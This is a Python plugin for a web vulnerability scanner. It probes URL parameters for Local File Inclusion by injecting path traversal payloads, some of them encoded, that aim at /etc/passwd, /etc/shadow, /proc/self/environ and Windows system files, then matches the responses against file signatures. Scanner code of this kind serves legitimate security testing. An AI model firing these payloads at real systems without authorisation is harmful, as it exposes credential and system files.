# scanner/plugins/lfi_plugin.py
"""
WASP LFI Plugin — Local File Inclusion scanner
Detects Local File Inclusion vulnerabilities by injecting
path traversal payloads into URL parameters.

Example vulnerable URL:
    http://site.com/page.php?file=about.html
    Inject: ?file=../../../etc/passwd
"""

from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from core.models import Severity
from scanner.plugins.base_plugin import BasePlugin


class LFIPlugin(BasePlugin):

    name        = "LFI Scanner"
    version     = "1.0"
    description = "Detects Local File Inclusion via path traversal"
    author      = "WASP"

    # Traversal payloads targeting common sensitive files
    PAYLOADS = [
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "../../../windows/win.ini",
        "../../../../windows/system32/drivers/etc/hosts",
        "../../../etc/shadow",
        "../../../proc/self/environ",
    ]

    # Signatures that confirm LFI
    SIGNATURES = [
        "root:x:0:0",          # /etc/passwd
        "root:!:0:0",          # /etc/shadow
        "[fonts]",             # windows/win.ini
        "localhost",           # /etc/hosts
        "HTTP_USER_AGENT",     # /proc/self/environ
        "daemon:x:",           # /etc/passwd
        "bin:x:",              # /etc/passwd
    ]

    def scan(
        self,
        urls: list[str],
        forms: list[dict] | None = None,
    ) -> list:

        self.log.info(
            f"LFI scan started. {len(urls)} URL(s) to probe."
        )

        for url in urls:
            if "?" not in url:
                continue
            self._test_url(url)

        self.log.info(
            f"LFI scan complete. {len(self.findings)} finding(s)."
        )
        return self.findings

    def _test_url(self, url: str) -> None:
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)

        for param_name in params:
            for payload in self.PAYLOADS:
                new_params = dict(params)
                new_params[param_name] = [payload]
                test_url   = urlunparse(
                    parsed._replace(
                        query=urlencode(new_params, doseq=True)
                    )
                )

                response = self.fetch(test_url)
                if response is None:
                    continue

                matched = self._check_signatures(response)
                if matched:
                    self.add_finding(
                        vuln_type   = "Local File Inclusion (LFI)",
                        url         = url,
                        parameter   = param_name,
                        payload     = payload,
                        severity    = Severity.HIGH,
                        description = (
                            f"Parameter '{param_name}' is vulnerable to "
                            f"Local File Inclusion. Path traversal payload "
                            f"'{payload}' exposed system file content."
                        ),
                        evidence    = f"Matched signature: {matched}",
                    )
                    return   # one finding per param is enough

    def _check_signatures(self, text: str) -> str | None:
        lower = text.lower()
        for sig in self.SIGNATURES:
            if sig.lower() in lower:
                return sig
        return None